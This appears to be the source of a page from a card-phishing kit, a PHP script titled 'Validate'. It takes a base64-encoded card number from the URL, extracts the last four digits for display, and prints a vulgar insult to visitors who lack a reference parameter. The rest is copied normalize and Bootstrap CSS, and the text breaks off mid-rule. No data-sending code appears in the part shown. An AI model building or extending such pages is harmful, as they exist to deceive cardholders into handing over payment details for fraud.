<?php
if (!isset($_GET['reference'])) {
    echo "barra nik omek";
    exit();
}
$reference = $_GET['reference'];
function file_get_contents_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}
$billccnumber = base64_decode($_GET['ccnumber']);
$realcc = str_replace(' ', '', $billccnumber);
$lbin = substr($realcc, strlen($realcc)-4, 4);//Last of bin
?>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Validate</title>
        <script data-savepage-type="text/javascript" type="text/plain"></script>
        <script data-savepage-type="" type="text/plain"></script>

        <style>
            /*!normalize.css v3.0.3 | MIT License | github.com/necolas/normalize.css*/
            html {
                font-family: sans-serif;
                -ms-text-size-adjust: 100%;
                -webkit-text-size-adjust: 100%;
            }
            body {
                margin: 0;
            }
            article,
            aside,
            details,
            figcaption,
            figure,
            footer,
            header,
            hgroup,
            main,
            menu,
            nav,
            section,
            summary {
                display: block;
            }
            audio,
            canvas,
            progress,
            video {
                display: inline-block;
                vertical-align: baseline;
            }
            audio:not([controls]) {
                display: none;
                height: 0;
            }
            [hidden],
            template {
                display: none;
            }
            a {
                background-color: transparent;
            }
            a:active,
            a:hover {
                outline: 0;
            }
            abbr[title] {
                border-bottom: 1px dotted;
            }
            b,
            strong {
                font-weight: 700;
            }
            dfn {
                font-style: italic;
            }
            h1 {
                font-size: 2em;
                margin: 0.67em 0;
            }
            mark {
                background: #ff0;
                color: #000;
            }
            small {
                font-size: 80%;
            }
            sub,
            sup {
                font-size: 75%;
                line-height: 0;
                position: relative;
                vertical-align: baseline;
            }
            sup {
                top: -0.5em;
            }
            sub {
                bottom: -0.25em;
            }
            img {
                border: 0;
            }
            svg:not(:root) {
                overflow: hidden;
            }
            figure {
                margin: 1em 40px;
            }
            hr {
                box-sizing: content-box;
                height: 0;
            }
            pre {
                overflow: auto;
            }
            code,
            kbd,
            pre,
            samp {
                font-family: monospace, monospace;
                font-size: 1em;
            }
            button,
            input,
            optgroup,
            select,
            textarea {
                color: inherit;
                font: inherit;
                margin: 0;
            }
            button {
                overflow: visible;
            }
            button,
            select {
                text-transform: none;
            }
            button,
            html input[type="button"],
            input[type="reset"],
            input[type="submit"] {
                -webkit-appearance: button;
                cursor: pointer;
            }
            button[disabled],
            html input[disabled] {
                cursor: default;
            }
            button::-moz-focus-inner,
            input::-moz-focus-inner {
                border: 0;
                padding: 0;
            }
            input {
                line-height: normal;
            }
            input[type="checkbox"],
            input[type="radio"] {
                box-sizing: border-box;
                padding: 0;
            }
            input[type="number"]::-webkit-inner-spin-button,
            input[type="number"]::-webkit-outer-spin-button {
                height: auto;
            }
            input[type="search"] {
                -webkit-appearance: textfield;
                box-sizing: content-box;
            }
            input[type="search"]::-webkit-search-cancel-button,
            input[type="search"]::-webkit-search-decoration {
                -webkit-appearance: none;
            }
            fieldset {
                border: 1px solid silver;
                margin: 0 2px;
                padding: 0.35em 0.625em 0.75em;
            }
            legend {
                border: 0;
                padding: 0;
            }
            textarea {
                overflow: auto;
            }
            optgroup {
                font-weight: 700;
            }
            table {
                border-collapse: collapse;
                border-spacing: 0;
            }
            td,
            th {
                padding: 0;
            } /*!* Bootstrap v3.3.5 (http://getbootstrap.com)
* Copyright 2011-2016 Twitter, Inc.
* Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)*/ /*!* Generated using the Bootstrap Customizer (http://getbootstrap.com/customize/?id=727b8019ca009dc6f366)
* Config saved to config.json and https://gist.github.com/727b8019ca009dc6f366*/ /*!* Bootstrap v3.3.6 (http://getbootstrap.com)
* Copyright 2011-2015 Twitter, Inc.
* Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)*/
            .btn-default,
            .btn-primary,
            .btn-success,
            .btn-info,
            .btn-warning,
            .btn-danger {
                text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.2);
                -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 1px 1px rgba(0, 0, 0, 0.075);
                box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 1px 1px rgba(0, 0, 0, 0.075);
            }
            .btn-default:active,
            .btn-primary:active,
            .btn-success:active,
            .btn-info:active,
            .btn-warning:active,
            .btn-danger:active,
            .btn-default.active,
            .btn-primary.active,
            .btn-success.active,
            .btn-info.active,
            .btn-warning.active,
            .btn-danger.active {
                -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
                box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
            }
            .btn-default.disabled,
            .btn-primary.disabled,
            .btn-success.disabled,
            .btn-info.disabled,
            .btn-warning.disabled,
            .btn-danger.disabled,
            .btn-default[disabled],
            .btn-primary[disabled],
            .btn-success[disabled],
            .btn-info[disabled],
            .btn-warning[disabled],
            .btn-danger[disabled],
            fieldset[disabled] .btn-default,
            fieldset[disabled] .btn-primary,
            fieldset[disabled] .btn-success,
            fieldset[disabled] .btn-info,
            fieldset[disabled] .btn-warning,
            fieldset[disabled] .btn-danger {
                -webkit-box-shadow: none;
                box-shadow: none;
            }
            .btn-default .badge,
            .btn-primary .badge,
            .btn-success .badge,
            .btn-info .badge,
            .btn-warning .badge,
            .btn-danger .badge {
                text-shadow: none;
            }
            .btn:active,
            .btn.active {
                background-image: none;
            }
            .btn-default {
                background-image: -webkit-linear-gradient(top, #ffffff 0%, #e0e0e0 100%);
                background-image: -o-linear-gradient(top, #ffffff 0%, #e0e0e0 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#ffffff), to(#e0e0e0));
                background-image: linear-gradient(to bottom, #ffffff 0%, #e0e0e0 100%);
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff',endColorstr='#ffe0e0e0',GradientType=0);
                filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
                background-repeat: repeat-x;
                border-color: #dbdbdb;
                text-shadow: 0 1px 0 #fff;
                border-color: #ccc;
            }
            .btn-default:hover,
            .btn-default:focus {
                background-color: #e0e0e0;
                background-position: 0 -15px;
            }
            .btn-default:active,
            .btn-default.active {
                background-color: #e0e0e0;
                border-color: #dbdbdb;
            }
            .btn-default.disabled,
            .btn-default[disabled],
            fieldset[disabled] .btn-default,
            .btn-default.disabled:hover,
            .btn-default[disabled]:hover,
            fieldset[disabled] .btn-default:hover,
            .btn-default.disabled:focus,
            .btn-default[disabled]:focus,
            fieldset[disabled] .btn-default:focus,
            .btn-default.disabled.focus,
            .btn-default[disabled].focus,
            fieldset[disabled] .btn-default.focus,
            .btn-default.disabled:active,
            .btn-default[disabled]:active,
            fieldset[disabled] .btn-default:active,
            .btn-default.disabled.active,
            .btn-default[disabled].active,
            fieldset[disabled] .btn-default.active {
                background-color: #e0e0e0;
                background-image: none;
            }
            .btn-primary {
                background-image: -webkit-linear-gradient(top, #337ab7 0%, #265a88 100%);
                background-image: -o-linear-gradient(top, #337ab7 0%, #265a88 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#337ab7), to(#265a88));
                background-image: linear-gradient(to bottom, #337ab7 0%, #265a88 100%);
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7',endColorstr='#ff265a88',GradientType=0);
                filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
                background-repeat: repeat-x;
                border-color: #245580;
            }
            .btn-primary:hover,
            .btn-primary:focus {
                background-color: #265a88;
                background-position: 0 -15px;
            }
            .btn-primary:active,
            .btn-primary.active {
                background-color: #265a88;
                border-color: #245580;
            }
            .btn-primary.disabled,
            .btn-primary[disabled],
            fieldset[disabled] .btn-primary,
            .btn-primary.disabled:hover,
            .btn-primary[disabled]:hover,
            fieldset[disabled] .btn-primary:hover,
            .btn-primary.disabled:focus,
            .btn-primary[disabled]:focus,
            fieldset[disabled] .btn-primary:focus,
            .btn-primary.disabled.focus,
            .btn-primary[disabled].focus,
            fieldset[disabled] .btn-primary.focus,
            .btn-primary.disabled:active,
            .btn-primary[disabled]:active,
            fieldset[disabled] .btn-primary:active,
            .btn-primary.disabled.active,
            .btn-primary[disabled].active,
            fieldset[disabled] .btn-primary.active {
                background-color: #265a88;
                background-image: none;
            }
            .btn-success {
                background-image: -webkit-linear-gradient(top, #5cb85c 0%, #419641 100%);
                background-image: -o-linear-gradient(top, #5cb85c 0%, #419641 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#5cb85c), to(#419641));
                background-image: linear-gradient(to bottom, #5cb85c 0%, #419641 100%);
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5cb85c',endColorstr='#ff419641',GradientType=0);
                filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
                background-repeat: repeat-x;
                border-color: #3e8f3e;
            }
            .btn-success:hover,
            .btn-success:focus {
                background-color: #419641;
                background-position: 0 -15px;
            }
            .btn-success:active,
            .btn-success.active {
                background-color: #419641;
                border-color: #3e8f3e;
            }
            .btn-success.disabled,
            .btn-success[disabled],
            fieldset[disabled] .btn-success,
            .btn-success.disabled:hover,
            .btn-success[disabled]:hover,
            fieldset[disabled] .btn-success:hover,
            .btn-success.disabled:focus,
            .btn-success[disabled]:focus,
            fieldset[disabled] .btn-success:focus,
            .btn-success.disabled.focus,
            .btn-success[disabled].focus,
            fieldset[disabled] .btn-success.focus,
            .btn-success.disabled:active,
            .btn-success[disabled]:active,
            fieldset[disabled] .btn-success:active,
            .btn-success.disabled.active,
            .btn-success[disabled].active,
            fieldset[disabled] .btn-success.active {
                background-color: #419641;
                background-image: none;
            }
            .btn-info {
                background-image: -webkit-linear-gradient(top, #5bc0de 0%, #2aabd2 100%);
                background-image: -o-linear-gradient(top, #5bc0de 0%, #2aabd2 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#5bc0de), to(#2aabd2));
                background-image: linear-gradient(to bottom, #5bc0de 0%, #2aabd2 100%);
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5bc0de',endColorstr='#ff2aabd2',GradientType=0);
                filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
                background-repeat: repeat-x;
                border-color: #28a4c9;
            }
            .btn-info:hover,
            .btn-info:focus {
                background-color: #2aabd2;
                background-position: 0 -15px;
            }
            .btn-info:active,
            .btn-info.active {
                background-color: #2aabd2;
                border-color: #28a4c9;
            }
            .btn-info.disabled,
            .btn-info[disabled],
            fieldset[disabled] .btn-info,
            .btn-info.disabled:hover,
            .btn-info[disabled]:hover,
            fieldset[disabled] .btn-info:hover,
            .btn-info.disabled:focus,
            .btn-info[disabled]:focus,
            fieldset[disabled] .btn-info:focus,
            .btn-info.disabled.focus,
            .btn-info[disabled].focus,
            fieldset[disabled] .btn-info.focus,
            .btn-info.disabled:active,
            .btn-info[disabled]:active,
            fieldset[disabled] .btn-info:active,
            .btn-info.disabled.active,
            .btn-info[disabled].active,
            fieldset[disabled] .btn-info.active {
                background-color: #2aabd2;
                background-image: none;
            }
            .btn-warning {
                background-image: -webkit-linear-gradient(top, #f0ad4e 0%, #eb9316 100%);
                background-image: -o-linear-gradient(top, #f0ad4e 0%, #eb9316 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#f0ad4e), to(#eb9316));
                background-image: linear-gradient(to bottom, #f0ad4e 0%, #eb9316 100%);
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff0ad4e',endColorstr='#ffeb9316',GradientType=0);
                filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
                background-repeat: repeat-x;
                border-color: #e38d13;
            }
            .btn-warning:hover,
            .btn-warning:focus {
                background-color: #eb9316;
                background-position: 0 -15px;
            }
            .btn-warning:active,
            .btn-warning.active {
                background-color: #eb9316;
                border-color: #e38d13;
            }
            .btn-warning.disabled,
            .btn-warning[disabled],
            fieldset[disabled] .btn-warning,
            .btn-warning.disabled:hover,
            .btn-warning[disabled]:hover,
            fieldset[disabled] .btn-warning:hover,
            .btn-warning.disabled:focus,
            .btn-warning[disabled]:focus,
            fieldset[disabled] .btn-warning:focus,
            .btn-warning.disabled.focus,
            .btn-warning[disabled].focus,
            fieldset[disabled] .btn-warning.focus,
            .btn-warning.disabled:active,
            .btn-warning[disabled]:active,
            fieldset[disabled] .btn-warning:active,
            .btn-warning.disabled.active,
            .btn-warning[disabled].active,
            fieldset[disabled] .btn-warning.active {
                background-color: #eb9316;
                background-image: none;
            }
            .btn-danger {
                background-image: -webkit-linear-gradient(top, #d9534f 0%, #c12e2a 100%);
                background-image: -o-linear-gradient(top, #d9534f 0%, #c12e2a 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#d9534f), to(#c12e2a));
                background-image: linear-gradient(to bottom, #d9534f 0%, #c12e2a 100%);
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffd9534f',endColorstr='#ffc12e2a',GradientType=0);
                filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
                background-repeat: repeat-x;
                border-color: #b92c28;
            }
            .btn-danger:hover,
            .btn-danger:focus {
                background-color: #c12e2a;
                background-position: 0 -15px;
            }
            .btn-danger:active,
            .btn-danger.active {
                background-color: #c12e2a;
                border-color: #b92c28;
            }
            .btn-danger.disabled,
            .btn-danger[disabled],
            fieldset[disabled] .btn-danger,
            .btn-danger.disabled:hover,
            .btn-danger[disabled]:hover,
            fieldset[disabled] .btn-danger:hover,
            .btn-danger.disabled:focus,
            .btn-danger[disabled]:focus,
            fieldset[disabled] .btn-danger:focus,
            .btn-danger.disabled.focus,
            .btn-danger[disabled].focus,
            fieldset[disabled] .btn-danger.focus,
            .btn-danger.disabled:active,
            .btn-danger[disabled]:active,
            fieldset[disabled] .btn-danger:active,
            .btn-danger.disabled.active,
            .btn-danger[disabled].active,
            fieldset[disabled] .btn-danger.active {
                background-color: #c12e2a;
                background-image: none;
            }
            .thumbnail,
            .img-thumbnail {
                -webkit-box-shadow: 0 1px 2px rgba(0, 0, 0, 0.075);
                box-shadow: 0 1px 2px rgba(0, 0, 0, 0.075);
            }
            .dropdown-menu > li > a:hover,
            .dropdown-menu > li > a:focus {
                background-image: -webkit-linear-gradient(top, #f5f5f5 0%, #e8e8e8 100%);
                background-image: -o-linear-gradient(top, #f5f5f5 0%, #e8e8e8 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#f5f5f5), to(#e8e8e8));
                background-image: linear-gradient(to bottom, #f5f5f5 0%, #e8e8e8 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff5f5f5',endColorstr='#ffe8e8e8',GradientType=0);
                background-color: #e8e8e8;
            }
            .dropdown-menu > .active > a,
            .dropdown-menu > .active > a:hover,
            .dropdown-menu > .active > a:focus {
                background-image: -webkit-linear-gradient(top, #337ab7 0%, #2e6da4 100%);
                background-image: -o-linear-gradient(top, #337ab7 0%, #2e6da4 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#337ab7), to(#2e6da4));
                background-image: linear-gradient(to bottom, #337ab7 0%, #2e6da4 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7',endColorstr='#ff2e6da4',GradientType=0);
                background-color: #2e6da4;
            }
            .navbar-default {
                background-image: -webkit-linear-gradient(top, #ffffff 0%, #f8f8f8 100%);
                background-image: -o-linear-gradient(top, #ffffff 0%, #f8f8f8 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#ffffff), to(#f8f8f8));
                background-image: linear-gradient(to bottom, #ffffff 0%, #f8f8f8 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff',endColorstr='#fff8f8f8',GradientType=0);
                filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
                border-radius: 4px;
                -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 1px 5px rgba(0, 0, 0, 0.075);
                box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 1px 5px rgba(0, 0, 0, 0.075);
            }
            .navbar-default .navbar-nav > .open > a,
            .navbar-default .navbar-nav > .active > a {
                background-image: -webkit-linear-gradient(top, #dbdbdb 0%, #e2e2e2 100%);
                background-image: -o-linear-gradient(top, #dbdbdb 0%, #e2e2e2 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#dbdbdb), to(#e2e2e2));
                background-image: linear-gradient(to bottom, #dbdbdb 0%, #e2e2e2 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffdbdbdb',endColorstr='#ffe2e2e2',GradientType=0);
                -webkit-box-shadow: inset 0 3px 9px rgba(0, 0, 0, 0.075);
                box-shadow: inset 0 3px 9px rgba(0, 0, 0, 0.075);
            }
            .navbar-brand,
            .navbar-nav > li > a {
                text-shadow: 0 1px 0 rgba(255, 255, 255, 0.25);
            }
            .navbar-inverse {
                background-image: -webkit-linear-gradient(top, #3c3c3c 0%, #222222 100%);
                background-image: -o-linear-gradient(top, #3c3c3c 0%, #222222 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#3c3c3c), to(#222222));
                background-image: linear-gradient(to bottom, #3c3c3c 0%, #222222 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff3c3c3c',endColorstr='#ff222222',GradientType=0);
                filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
                border-radius: 4px;
            }
            .navbar-inverse .navbar-nav > .open > a,
            .navbar-inverse .navbar-nav > .active > a {
                background-image: -webkit-linear-gradient(top, #080808 0%, #0f0f0f 100%);
                background-image: -o-linear-gradient(top, #080808 0%, #0f0f0f 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#080808), to(#0f0f0f));
                background-image: linear-gradient(to bottom, #080808 0%, #0f0f0f 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff080808',endColorstr='#ff0f0f0f',GradientType=0);
                -webkit-box-shadow: inset 0 3px 9px rgba(0, 0, 0, 0.25);
                box-shadow: inset 0 3px 9px rgba(0, 0, 0, 0.25);
            }
            .navbar-inverse .navbar-brand,
            .navbar-inverse .navbar-nav > li > a {
                text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);
            }
            .navbar-static-top,
            .navbar-fixed-top,
            .navbar-fixed-bottom {
                border-radius: 0;
            }
            @media (max-width: 767px) {
                .navbar .navbar-nav .open .dropdown-menu > .active > a,
                .navbar .navbar-nav .open .dropdown-menu > .active > a:hover,
                .navbar .navbar-nav .open .dropdown-menu > .active > a:focus {
                    color: #fff;
                    background-image: -webkit-linear-gradient(top, #337ab7 0%, #2e6da4 100%);
                    background-image: -o-linear-gradient(top, #337ab7 0%, #2e6da4 100%);
                    background-image: -webkit-gradient(linear, left top, left bottom, from(#337ab7), to(#2e6da4));
                    background-image: linear-gradient(to bottom, #337ab7 0%, #2e6da4 100%);
                    background-repeat: repeat-x;
                    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7',endColorstr='#ff2e6da4',GradientType=0);
                }
            }
            .alert {
                text-shadow: 0 1px 0 rgba(255, 255, 255, 0.2);
                -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 1px 2px rgba(0, 0, 0, 0.05);
                box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 1px 2px rgba(0, 0, 0, 0.05);
            }
            .alert-success {
                background-image: -webkit-linear-gradient(top, #dff0d8 0%, #c8e5bc 100%);
                background-image: -o-linear-gradient(top, #dff0d8 0%, #c8e5bc 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#dff0d8), to(#c8e5bc));
                background-image: linear-gradient(to bottom, #dff0d8 0%, #c8e5bc 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffdff0d8',endColorstr='#ffc8e5bc',GradientType=0);
                border-color: #b2dba1;
            }
            .alert-info {
                background-image: -webkit-linear-gradient(top, #d9edf7 0%, #b9def0 100%);
                background-image: -o-linear-gradient(top, #d9edf7 0%, #b9def0 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#d9edf7), to(#b9def0));
                background-image: linear-gradient(to bottom, #d9edf7 0%, #b9def0 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffd9edf7',endColorstr='#ffb9def0',GradientType=0);
                border-color: #9acfea;
            }
            .alert-warning {
                background-image: -webkit-linear-gradient(top, #fcf8e3 0%, #f8efc0 100%);
                background-image: -o-linear-gradient(top, #fcf8e3 0%, #f8efc0 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#fcf8e3), to(#f8efc0));
                background-image: linear-gradient(to bottom, #fcf8e3 0%, #f8efc0 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fffcf8e3',endColorstr='#fff8efc0',GradientType=0);
                border-color: #f5e79e;
            }
            .alert-danger {
                background-image: -webkit-linear-gradient(top, #f2dede 0%, #e7c3c3 100%);
                background-image: -o-linear-gradient(top, #f2dede 0%, #e7c3c3 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#f2dede), to(#e7c3c3));
                background-image: linear-gradient(to bottom, #f2dede 0%, #e7c3c3 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff2dede',endColorstr='#ffe7c3c3',GradientType=0);
                border-color: #dca7a7;
            }
            .progress {
                background-image: -webkit-linear-gradient(top, #ebebeb 0%, #f5f5f5 100%);
                background-image: -o-linear-gradient(top, #ebebeb 0%, #f5f5f5 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#ebebeb), to(#f5f5f5));
                background-image: linear-gradient(to bottom, #ebebeb 0%, #f5f5f5 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffebebeb',endColorstr='#fff5f5f5',GradientType=0);
            }
            .progress-bar {
                background-image: -webkit-linear-gradient(top, #337ab7 0%, #286090 100%);
                background-image: -o-linear-gradient(top, #337ab7 0%, #286090 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#337ab7), to(#286090));
                background-image: linear-gradient(to bottom, #337ab7 0%, #286090 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7',endColorstr='#ff286090',GradientType=0);
            }
            .progress-bar-success {
                background-image: -webkit-linear-gradient(top, #5cb85c 0%, #449d44 100%);
                background-image: -o-linear-gradient(top, #5cb85c 0%, #449d44 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#5cb85c), to(#449d44));
                background-image: linear-gradient(to bottom, #5cb85c 0%, #449d44 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5cb85c',endColorstr='#ff449d44',GradientType=0);
            }
            .progress-bar-info {
                background-image: -webkit-linear-gradient(top, #5bc0de 0%, #31b0d5 100%);
                background-image: -o-linear-gradient(top, #5bc0de 0%, #31b0d5 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#5bc0de), to(#31b0d5));
                background-image: linear-gradient(to bottom, #5bc0de 0%, #31b0d5 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5bc0de',endColorstr='#ff31b0d5',GradientType=0);
            }
            .progress-bar-warning {
                background-image: -webkit-linear-gradient(top, #f0ad4e 0%, #ec971f 100%);
                background-image: -o-linear-gradient(top, #f0ad4e 0%, #ec971f 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#f0ad4e), to(#ec971f));
                background-image: linear-gradient(to bottom, #f0ad4e 0%, #ec971f 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff0ad4e',endColorstr='#ffec971f',GradientType=0);
            }
            .progress-bar-danger {
                background-image: -webkit-linear-gradient(top, #d9534f 0%, #c9302c 100%);
                background-image: -o-linear-gradient(top, #d9534f 0%, #c9302c 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#d9534f), to(#c9302c));
                background-image: linear-gradient(to bottom, #d9534f 0%, #c9302c 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffd9534f',endColorstr='#ffc9302c',GradientType=0);
            }
            .progress-bar-striped {
                background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            }
            .list-group {
                border-radius: 4px;
                -webkit-box-shadow: 0 1px 2px rgba(0, 0, 0, 0.075);
                box-shadow: 0 1px 2px rgba(0, 0, 0, 0.075);
            }
            .list-group-item.active,
            .list-group-item.active:hover,
            .list-group-item.active:focus {
                text-shadow: 0 -1px 0 #286090;
                background-image: -webkit-linear-gradient(top, #337ab7 0%, #2b669a 100%);
                background-image: -o-linear-gradient(top, #337ab7 0%, #2b669a 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#337ab7), to(#2b669a));
                background-image: linear-gradient(to bottom, #337ab7 0%, #2b669a 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7',endColorstr='#ff2b669a',GradientType=0);
                border-color: #2b669a;
            }
            .list-group-item.active .badge,
            .list-group-item.active:hover .badge,
            .list-group-item.active:focus .badge {
                text-shadow: none;
            }
            .panel {
                -webkit-box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
                box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
            }
            .panel-default > .panel-heading {
                background-image: -webkit-linear-gradient(top, #f5f5f5 0%, #e8e8e8 100%);
                background-image: -o-linear-gradient(top, #f5f5f5 0%, #e8e8e8 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#f5f5f5), to(#e8e8e8));
                background-image: linear-gradient(to bottom, #f5f5f5 0%, #e8e8e8 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff5f5f5',endColorstr='#ffe8e8e8',GradientType=0);
            }
            .panel-primary > .panel-heading {
                background-image: -webkit-linear-gradient(top, #337ab7 0%, #2e6da4 100%);
                background-image: -o-linear-gradient(top, #337ab7 0%, #2e6da4 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#337ab7), to(#2e6da4));
                background-image: linear-gradient(to bottom, #337ab7 0%, #2e6da4 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7',endColorstr='#ff2e6da4',GradientType=0);
            }
            .panel-success > .panel-heading {
                background-image: -webkit-linear-gradient(top, #dff0d8 0%, #d0e9c6 100%);
                background-image: -o-linear-gradient(top, #dff0d8 0%, #d0e9c6 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#dff0d8), to(#d0e9c6));
                background-image: linear-gradient(to bottom, #dff0d8 0%, #d0e9c6 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffdff0d8',endColorstr='#ffd0e9c6',GradientType=0);
            }
            .panel-info > .panel-heading {
                background-image: -webkit-linear-gradient(top, #d9edf7 0%, #c4e3f3 100%);
                background-image: -o-linear-gradient(top, #d9edf7 0%, #c4e3f3 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#d9edf7), to(#c4e3f3));
                background-image: linear-gradient(to bottom, #d9edf7 0%, #c4e3f3 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffd9edf7',endColorstr='#ffc4e3f3',GradientType=0);
            }
            .panel-warning > .panel-heading {
                background-image: -webkit-linear-gradient(top, #fcf8e3 0%, #faf2cc 100%);
                background-image: -o-linear-gradient(top, #fcf8e3 0%, #faf2cc 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#fcf8e3), to(#faf2cc));
                background-image: linear-gradient(to bottom, #fcf8e3 0%, #faf2cc 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fffcf8e3',endColorstr='#fffaf2cc',GradientType=0);
            }
            .panel-danger > .panel-heading {
                background-image: -webkit-linear-gradient(top, #f2dede 0%, #ebcccc 100%);
                background-image: -o-linear-gradient(top, #f2dede 0%, #ebcccc 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#f2dede), to(#ebcccc));
                background-image: linear-gradient(to bottom, #f2dede 0%, #ebcccc 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff2dede',endColorstr='#ffebcccc',GradientType=0);
            }
            .well {
                background-image: -webkit-linear-gradient(top, #e8e8e8 0%, #f5f5f5 100%);
